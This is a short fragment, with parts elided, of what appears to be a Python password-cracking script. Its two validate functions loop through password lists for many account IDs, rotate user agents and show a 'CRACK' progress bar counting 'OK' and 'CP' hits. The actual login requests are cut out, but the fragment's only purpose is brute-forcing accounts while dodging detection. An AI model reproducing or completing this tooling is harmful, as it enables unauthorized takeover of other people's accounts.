...
def validate1(idf,pwv):
	...
	ses = requests.Session()
	prog.update(des,description=f"[bold green]CRACK[bold green] {loop}/{len(id)} [bold white]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
...
def validate2(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{bo}    CRACK[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
